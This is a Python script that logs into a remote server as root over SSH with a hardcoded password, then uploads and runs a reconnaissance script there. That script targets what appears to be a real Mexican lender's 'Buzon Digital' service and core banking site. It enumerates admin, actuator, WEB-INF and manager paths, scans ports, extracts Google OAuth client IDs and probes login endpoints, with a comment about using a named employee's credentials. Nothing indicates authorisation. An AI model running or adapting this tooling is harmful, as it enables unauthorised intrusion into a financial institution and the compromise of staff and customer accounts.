import paramiko, sys, time

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = """
import requests, urllib3, json, sys, time, re
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.111 Safari/537.36"

# ========================================
# 1. BUZON DIGITAL — FULL PROBE
# ========================================
sys.stdout.write("=" * 60 + "\\n=== BUZON DIGITAL FINDEP (35.192.238.30:8080) ===\\n" + "=" * 60 + "\\n\\n")

BUZON = "http://35.192.238.30:8080"
s = requests.Session()
s.headers.update({"User-Agent": UA})

# Main page
try:
    r = s.get(BUZON + "/BuzonDigital/", timeout=15)
    sys.stdout.write("[" + str(r.status_code) + "] / (" + str(len(r.text)) + "b)\\n")
    sys.stdout.write("Title: ")
    tm = re.search(r'<title>(.*?)</title>', r.text, re.I | re.S)
    if tm: sys.stdout.write(tm.group(1).strip()[:100])
    sys.stdout.write("\\n")
    sys.stdout.write("Headers: " + json.dumps(dict(r.headers))[:300] + "\\n")
    sys.stdout.write("Cookies: " + str(dict(s.cookies))[:200] + "\\n")
    sys.stdout.write("First 1000:\\n" + r.text[:1000] + "\\n\\n")
    
    # Save full page
    with open("/root/buzon_digital_main.html", "w") as f:
        f.write(r.text)
    
    # Extract links
    links = re.findall(r'href="([^"]+)"', r.text)
    sys.stdout.write("Links: " + str(len(links)) + "\\n")
    for l in links[:30]:
        sys.stdout.write("  " + l[:120] + "\\n")
    
    # Extract forms
    forms = re.findall(r'<form[^>]*>(.*?)</form>', r.text, re.S | re.I)
    for fi, form in enumerate(forms):
        act = re.search(r'action="([^"]*)"', form)
        inputs = re.findall(r'name="([^"]*)"', form)
        sys.stdout.write("  Form " + str(fi) + ": action=" + (act.group(1) if act else "?") + " inputs=" + str(inputs)[:200] + "\\n")
    
except Exception as e:
    sys.stdout.write("ERR: " + str(e)[:100] + "\\n")
sys.stdout.flush()

# Probe common paths
sys.stdout.write("\\n--- Path enumeration ---\\n")
paths = [
    "/BuzonDigital/login", "/BuzonDigital/login.jsp", "/BuzonDigital/index.jsp",
    "/BuzonDigital/admin", "/BuzonDigital/api", "/BuzonDigital/api/v1",
    "/BuzonDigital/swagger-ui.html", "/BuzonDigital/swagger-ui/",
    "/BuzonDigital/actuator", "/BuzonDigital/actuator/health", "/BuzonDigital/actuator/env",
    "/BuzonDigital/console", "/BuzonDigital/manager", "/BuzonDigital/status",
    "/BuzonDigital/WEB-INF/web.xml",
    "/manager/html", "/manager/status", "/status",
    "/BuzonDigital/rest", "/BuzonDigital/services", "/BuzonDigital/ws",
    "/BuzonDigital/upload", "/BuzonDigital/download", "/BuzonDigital/files",
    "/BuzonDigital/documentos", "/BuzonDigital/docs",
    "/", "/BuzonDigital/health", "/BuzonDigital/info",
    "/BuzonDigital/j_security_check",
    "/BuzonDigital/servlet", "/BuzonDigital/faces/",
]

for p in paths:
    try:
        r = s.get(BUZON + p, timeout=8, allow_redirects=False)
        if r.status_code not in [404]:
            loc = r.headers.get("Location", "")[:60]
            ct = r.headers.get("Content-Type", "")[:30]
            sys.stdout.write("  [" + str(r.status_code) + "] " + p + " (" + str(len(r.text)) + "b) ct=" + ct)
            if loc:
                sys.stdout.write(" → " + loc)
            sys.stdout.write("\\n")
            
            # If it's a page with content, save it
            if r.status_code == 200 and len(r.text) > 500:
                fname = p.replace("/", "_").replace(".", "_")[:50]
                with open("/root/buzon_" + fname + ".html", "w") as f:
                    f.write(r.text)
    except Exception as e:
        sys.stdout.write("  [ERR] " + p + " — " + str(e)[:40] + "\\n")
    sys.stdout.flush()

# Also check if other ports are open
sys.stdout.write("\\n--- Other ports on 35.192.238.30 ---\\n")
import socket
for port in [22, 80, 443, 3306, 5432, 8443, 9090, 8888, 8000, 3000, 5000, 7001, 9200]:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex(("35.192.238.30", port))
        if result == 0:
            sys.stdout.write("  PORT " + str(port) + " OPEN\\n")
        sock.close()
    except:
        pass
    sys.stdout.flush()


# ========================================
# 2. GOOGLE CLIENT ID from Core Banking
# ========================================
sys.stdout.write("\\n\\n" + "=" * 60 + "\\n=== GOOGLE OAUTH — CORE BANKING ===\\n" + "=" * 60 + "\\n\\n")

r_core = requests.get("https://core.findep.mx/core/index.jsp", verify=False, headers={"User-Agent": UA}, timeout=15)

# Extract Google Client ID
gid = re.search(r'client_id["\':\\s=]+([\\d\\-]+\\.apps\\.googleusercontent\\.com)', r_core.text)
if gid:
    sys.stdout.write("Google Client ID: " + gid.group(1) + "\\n")

# Extract from meta tag
meta_gid = re.search(r'google-signin-client_id["\\'\\s]*content=["\\'](.*?)["\\'"]', r_core.text)
if meta_gid:
    sys.stdout.write("Google Client ID (meta): " + meta_gid.group(1) + "\\n")

# Extract from script src
gapi = re.search(r'(apis\\.google\\.com[^"]*)', r_core.text)
if gapi:
    sys.stdout.write("Google API: " + gapi.group(1) + "\\n")

# Extract from data attributes
data_gid = re.search(r'data-[^=]*client[^=]*=["\\'](.*?)["\\'"]', r_core.text, re.I)
if data_gid:
    sys.stdout.write("Google data attr: " + data_gid.group(1) + "\\n")

# Look for the full Google Sign-In config
gsignin = re.findall(r'google[^<]*sign[^<]*', r_core.text, re.I)
for g in gsignin[:5]:
    sys.stdout.write("  Google ref: " + g.strip()[:150] + "\\n")

# Extract onSignIn function fully
onsignin = re.search(r'function onSignIn\(.*?\)\s*\{(.*?)\}', r_core.text, re.S)
if onsignin:
    sys.stdout.write("\\nonSignIn body:\\n" + onsignin.group(1).strip()[:500] + "\\n")

# Look for the endpoint where Google token is sent
token_post = re.findall(r'(?:url|action|href|fetch|ajax|post|get)\s*[:=(]\s*["\\'](.*?)["\\'"]', r_core.text, re.I)
for tp in token_post:
    if "google" in tp.lower() or "token" in tp.lower() or "auth" in tp.lower() or "valida" in tp.lower():
        sys.stdout.write("  Token endpoint: " + tp[:100] + "\\n")

# Try login with afigueroac creds through different endpoints  
sys.stdout.write("\\n--- Alternative login paths ---\\n")
alt_paths = [
    "/core/validaGoogle.do", "/core/loginGoogle.do", "/core/googleAuth.do",
    "/core/j_security_check", "/core/login.do", "/core/auth.do",
]
for p in alt_paths:
    try:
        r = requests.get("https://core.findep.mx" + p, verify=False, headers={"User-Agent": UA}, timeout=8, allow_redirects=False)
        sys.stdout.write("  [" + str(r.status_code) + "] " + p + " (" + str(len(r.text)) + "b)\\n")
    except:
        pass
    sys.stdout.flush()

sys.stdout.write("\\n=== DONE ===\\n")
"""

sftp = ssh.open_sftp()
with sftp.open('/root/buzon_probe.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

transport = ssh.get_transport()
channel = transport.open_session()
channel.exec_command('python3 -u /root/buzon_probe.py 2>&1')
channel.settimeout(5)

start = time.time()
while time.time() - start < 120:
    try:
        if channel.recv_ready():
            chunk = channel.recv(8192).decode(errors='replace')
            sys.stdout.write(chunk)
            sys.stdout.flush()
        elif channel.exit_status_ready():
            while channel.recv_ready():
                chunk = channel.recv(8192).decode(errors='replace')
                sys.stdout.write(chunk)
                sys.stdout.flush()
            break
        else:
            time.sleep(0.3)
    except Exception:
        time.sleep(0.3)

print('\nFin.', flush=True)
ssh.close()
